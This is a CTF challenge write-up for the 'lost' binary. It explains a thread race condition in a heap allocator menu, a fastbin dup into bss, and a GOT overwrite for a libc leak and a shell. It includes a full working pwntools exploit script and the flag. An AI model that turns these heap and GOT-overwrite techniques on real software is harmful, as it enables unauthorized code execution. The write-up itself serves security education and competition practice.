I"&m<p><strong>Attachments</strong>: <a href="/assets/img/lost/lost">binary</a>     <a href="/assets/img/lost/libc.so.6">libc</a>     <a href="/assets/img/lost/lost.c">source</a></p>

<p>The binary is a 64-bit ELF, non-stripped. Here are the mitigation’s enforced.</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td> --><td class="rouge-code"><pre>  <span class="nx">gdb</span><span class="o">-</span><span class="nx">peda$</span> <span class="nx">checksec</span>
  <span class="nx">CANARY</span>    <span class="p">:</span> <span class="nx">ENABLED</span>
  <span class="nx">FORTIFY</span>   <span class="p">:</span> <span class="nx">disabled</span>
  <span class="nx">NX</span>        <span class="p">:</span> <span class="nx">ENABLED</span>
  <span class="nx">PIE</span>       <span class="p">:</span> <span class="nx">disabled</span>
  <span class="nx">RELRO</span>     <span class="p">:</span> <span class="nx">Partial</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Thats not much!</p>

<h2 id="reversing">Reversing</h2>

<p>The source code is provided along with this post. So you can quickly go through it. Basically the binary allocates chunks on the heap, stores the pointer to the chunk in a global variable named <code class="language-plaintext highlighter-rouge">ptr</code> and allows us to edit the chunk pointed to by <code class="language-plaintext highlighter-rouge">ptr</code>. The catch is that <code class="language-plaintext highlighter-rouge">ptr</code> is overwritten each time a new chunk is allocated, so it only contains the pointer to the last allocated chunk. Here’s a quick overview of the main functionalities -</p>

<ul>
  <li>
    <p><u>alloc</u> : This option asks the user how many chunks to allocate at a time (1 or 2) and, if 2, then creates a separate thread to allocate a second chunk (1 chunk is allocated by the main thread). The catch is that, if there are multi-threds, then each thread times out after 4 seconds. Oh, and we also can input an author name. The pointer to the heap chunk, the size and the pointer to author name are stored in global variable’s namely, <code class="language-plaintext highlighter-rouge">ptr</code>, <code class="language-plaintext highlighter-rouge">size</code> and <code class="language-plaintext highlighter-rouge">author</code>. So these are overwritten each time <code class="language-plaintext highlighter-rouge">alloc</code> is called.</p>
  </li>
  <li>
    <p><u>edit</u> : This allows us to edit the chunk pointed to by <code class="language-plaintext highlighter-rouge">ptr</code>, if one exists. We can only edit <code class="language-plaintext highlighter-rouge">size</code> bytes.</p>
  </li>
</ul>

<p><strong>Note</strong>: The <i>sem_****</i> methods are just there to guarantee synchronous behavior among the various threads and can be considered irrelevant in our exploit.</p>

<h2 id="vulnerability">Vulnerability</h2>

<p>Race condition in <code class="language-plaintext highlighter-rouge">alloc</code> when the context switch between threads is taking place.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td> --><td class="rouge-code"><pre><span class="k">do</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Enter Size %d: "</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
  <span class="n">size</span><span class="o">=</span><span class="n">getint</span><span class="p">();</span>
<span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="n">size</span><span class="o">&lt;=</span><span class="mi">0</span> <span class="o">||</span> <span class="n">size</span><span class="o">&gt;</span><span class="mi">1000</span><span class="p">);</span>
<span class="n">ptr</span><span class="o">=</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Enter Author name : "</span><span class="p">);</span>
<span class="n">getinp</span><span class="p">(</span><span class="n">auth</span><span class="p">,</span><span class="mh">0xf0</span><span class="p">);</span>
<span class="n">author</span><span class="o">=</span><span class="n">strdup</span><span class="p">(</span><span class="n">auth</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Enter Data %d: "</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
<span class="n">getinp</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>So, in thread1, after the <code class="language-plaintext highlighter-rouge">malloc(size)</code> statement is executed, if we wait for 4 seconds, then thread2 begins execution. Now we give the <code class="language-plaintext highlighter-rouge">size</code> value as any integer above 1000, and again wait for 4 seconds so the control is passed back to thread1. Notice that in thread2, since the control never came out of the while loop, the <code class="language-plaintext highlighter-rouge">ptr</code> pointer was never reset, while now the <code class="language-plaintext highlighter-rouge">size</code> has been updated to a large value. So in thread1, in <code class="language-plaintext highlighter-rouge">getinp(ptr,size)</code> statement, we have a huge heap overflow.</p>

<p><strong>Note</strong>: Since there is no “view” functionality in the code, I saw no way to get a memory leak by just using the provided functions.</p>

<h2 id="exploit">Exploit</h2>

<p>Right, so we have a huge heap overflow now. So what do we do with that? There is no call to <code class="language-plaintext highlighter-rouge">free</code> in the code and neither is there a memory leak. This prevents us from using many traditional heap exploitation techniques. Also, due to lack of memory leaks, we can’t do a House of Orange.</p>

<p>Well, the aim is to use the heap extension functionality of <code class="language-plaintext highlighter-rouge">malloc</code> to free the top chunk such that the top chunk size lies in the fastbin range and then do a fastbin dup to bss segment (PIE is off, so we have the bss addresses). I’ve written about this method here - <a href="https://vigneshsrao.github.io//fastbin-dup/">vigneshsrao.github.io//fastbin-dup</a>. If something in this para was unclear, then please go through this post, which explains the method that we will be using, in more detail.</p>

<p>Okay, so lets get started. First use the heap overflow to change the size of the top chunk to a smaller (but page aligned) value. Now we will allocate chunk such that the size of the top chunk is just enough to hold another data chunk.</p>

<p>After the next data chunk has been allocated, the size of the top chunk should be <code class="language-plaintext highlighter-rouge">0x70(required)+0x20 = 0x90</code> bytes. The 0x20 bytes extra are for the misc usage of <code class="language-plaintext highlighter-rouge">malloc</code> while it extends the chunk.</p>

<p>Now we will set the <code class="language-plaintext highlighter-rouge">author</code> such that the size is more than 0x90. When <code class="language-plaintext highlighter-rouge">malloc</code> tries to service this request, it sees that that the size of the top chunk is too small and tries to extend the heap. Thus the current top chunk is freed (after 0x20 bytes have been taken out). But while freeing the top chunk, its size was 0x70 which is in the fastbin range. So this goes into the 0x70 size fastbin freelist instead of the unsorted bin.</p>

<p>And now finally we use the race condition a second time to get an overflow into the fastbin (freed top chunk) and edit its <code class="language-plaintext highlighter-rouge">fd</code> pointer.</p>

<p>Lets just quickly sum up what we did in the last couple of para’s</p>

<ul>
  <li>Make top chunk of size = 0x90 + sizeof(1 data chunk)</li>
  <li>
    <p>allocate the data chunk such that the size of the remaining top chunk = 0x90. Now in the same thread, allocate <code class="language-plaintext highlighter-rouge">author</code> such that its size is &gt; 0x90. This will lead to top getting freed and allocate the <code class="language-plaintext highlighter-rouge">author</code> in the extended heap segment. So this is how the heap would look-</p>

    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td> --><td class="rouge-code"><pre>    misc chunks
--------------------
      chunk
--------------------
  freed top chunk
--------------------
--------------------
      author
--------------------
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>So now we use the race and get an overflow from the chunk just above the top. Thus we can overwrite the <code class="language-plaintext highlighter-rouge">fd</code> of 0x70 sized fastbin chunk.</li>
</ul>

<p>Since we know the bss address and all libc addresses start with 0x7f, we can use one GOT value as target for fastbin corruption. Lets use <code class="language-plaintext highlighter-rouge">stderr</code> GOT address for this. So we overwrite the <code class="language-plaintext highlighter-rouge">fd</code> of the free chunk with <code class="language-plaintext highlighter-rouge">stderr</code> GOT +5-8.
The + 5 for getting the size as 0x7f and -8 as we need to give the start of the chunk in <code class="language-plaintext highlighter-rouge">fd</code>.</p>

<p>Now the next time we allocate chunk of size 0x70 we are returned the previously freeed top chunk and in the next request for size 0x70, we get the chunk in bss, just below <code class="language-plaintext highlighter-rouge">stderr</code>.</p>

<p>Here’s how the area near <code class="language-plaintext highlighter-rouge">stderr</code> in bss looks like</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td> --><td class="rouge-code"><pre>0x6020c0 &lt;stdout@@GLIBC_2.2.5&gt;:	0x00007ffff7bb5620	0x0000000000000000
0x6020d0 &lt;stdin@@GLIBC_2.2.5&gt;:	0x00007ffff7bb48e0	0x0000000000000000
0x6020e0 &lt;stderr@@GLIBC_2.2.5&gt;:	0x00007ffff7bb5540	0x0000000000000000
0x6020f0 &lt;ptr&gt;:	0x0000000000000000	0x0000000000000000
0x602100 &lt;size&gt;:	0x0000000000000000	0x0000000000000000
0x602110:	0x0000000000000000	0x0000000000000000
0x602120 &lt;sema&gt;:	0x0000000000000000	0x0000000000000000
0x602130 &lt;sema+16&gt;:	0x0000000000000000	0x0000000000000000
</pre></td></tr></tbody></table></code></pre></div></div>
<p>And here’s the area aligned as a heap chunk</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td> --><td class="rouge-code"><pre>gdb-peda$ x/xg 0x6020dd
0x6020dd:	0xfff7bb5540000000   &lt;--Chunk start
0x6020e5 &lt;stderr@@GLIBC_2.2.5+5&gt;:	0x000000000000007f
0x6020ed:	0x0000000000000000    &lt;-- We have write access from here
0x6020f5 &lt;ptr+5&gt;:	0x0000000000000000
0x6020fd &lt;author+5&gt;:	0x0000000000000000
0x602105:	0x0000000000000000
</pre></td></tr></tbody></table></code></pre></div></div>
<p>So we can basically overwrite the value of <code class="language-plaintext highlighter-rouge">ptr</code>. Lets overwrite this with GOT address of <code class="language-plaintext highlighter-rouge">atoi</code>. First to get a leak. For this edit the chunk (which is basically GOT of <code class="language-plaintext highlighter-rouge">atoi</code>) and make its value as PLT of <code class="language-plaintext highlighter-rouge">printf</code>. Then use format strings to leak out libc. After this edit the chunk again to overwrite <code class="language-plaintext highlighter-rouge">atoi</code> GOT with <code class="language-plaintext highlighter-rouge">system</code> address. Next time the prompt for option is presented, enter <code class="language-plaintext highlighter-rouge">/bin/sh</code> and booooom, you get a shell!</p>

<p>Here’s my exploit script for the same -</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
</pre></td> --><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">HOST</span><span class="o">=</span><span class="s">'localhost'</span>
<span class="n">PORT</span><span class="o">=</span><span class="mi">3333</span>


<span class="k">def</span> <span class="nf">connect</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
        <span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./chall'</span><span class="p">)</span>

<span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">opt</span><span class="p">):</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter choice &gt;&gt; "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">opt</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter new data: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">race_cond</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">size2</span><span class="p">,</span><span class="n">data2</span><span class="p">,</span><span class="n">size2_act</span><span class="p">,</span><span class="n">auth</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"How many chunks at a time (1/2) ? "</span><span class="p">,</span><span class="s">'2'</span><span class="p">)</span>
    <span class="n">out</span><span class="o">=</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">": "</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">out</span><span class="p">[</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">==</span><span class="s">'2'</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"unsuccessful"</span><span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Sleep1 over"</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Size 2: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size2</span><span class="p">))</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Sleep2 over"</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">auth</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Data 1: "</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size2_act</span><span class="p">))</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Author name : "</span><span class="p">,</span><span class="n">auth</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Data 2: "</span><span class="p">,</span><span class="n">data2</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">1</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">auth</span><span class="o">=</span><span class="s">'q'</span><span class="o">*</span><span class="mh">0xf0</span><span class="p">,</span><span class="n">l</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"How many chunks at a time (1/2) ? "</span><span class="p">,</span><span class="s">'1'</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Size 1: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">l</span><span class="p">:</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Author name : "</span><span class="p">,</span><span class="n">auth</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">"Enter Author name : "</span><span class="p">,</span><span class="n">auth</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter Data 1: "</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">1000</span><span class="o">-</span><span class="mh">0x100</span><span class="p">,</span><span class="s">"q"</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">1000</span><span class="o">-</span><span class="mh">0x100</span><span class="p">,</span><span class="s">"q"</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">1000</span><span class="o">-</span><span class="mh">0x100</span><span class="p">,</span><span class="s">"q"</span><span class="p">)</span>
    <span class="n">race_cond</span><span class="p">(</span><span class="mi">568</span><span class="p">,</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0x230</span><span class="o">+</span><span class="s">"qqqqqqqq"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020dd</span><span class="p">),</span><span class="mi">10000</span><span class="p">,</span><span class="s">"aa"</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="s">"q"</span><span class="o">*</span><span class="p">(</span><span class="mh">0xf0</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">90</span><span class="p">,</span><span class="s">"q"</span><span class="p">)</span>
    <span class="n">alloc</span><span class="p">(</span><span class="mi">90</span><span class="p">,</span><span class="s">"qqq"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x602088</span><span class="p">))</span>
    <span class="n">edit</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400970</span><span class="p">))</span>
    <span class="n">menu</span><span class="p">(</span><span class="s">"%3$p##"</span><span class="p">)</span>
    <span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"##"</span><span class="p">).</span><span class="n">replace</span><span class="p">(</span><span class="s">"##"</span><span class="p">,</span><span class="s">''</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x3da51d</span>
    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc @ "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
    <span class="n">l</span><span class="o">=</span><span class="mh">0x602088</span>
    <span class="n">menu</span><span class="p">(</span><span class="s">"11"</span><span class="p">)</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter new data: "</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
    <span class="n">menu</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>

    <span class="n">success</span><span class="o">=</span><span class="bp">False</span>
    <span class="k">while</span><span class="p">(</span><span class="ow">not</span> <span class="n">success</span><span class="p">):</span>
        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">:</span>
            <span class="n">r</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span><span class="n">PORT</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">r</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s">'./chall'</span><span class="p">)</span>
        <span class="n">success</span><span class="o">=</span><span class="n">race_cond</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span><span class="o">+</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xea1</span><span class="p">),</span><span class="mi">10000</span><span class="p">,</span><span class="s">"12"</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="s">"QQQQ"</span><span class="p">)</span>

    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"successful"</span><span class="p">)</span>
    <span class="n">exploit</span><span class="p">()</span>
    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>And the flag was</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
</pre></td> --><td class="rouge-code"><pre>InCTF{w1n_th3_r4c3_t0_r0mp_1n_the_h34p}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Hope you enjoyed this challenge and our CTF !</p>
:ET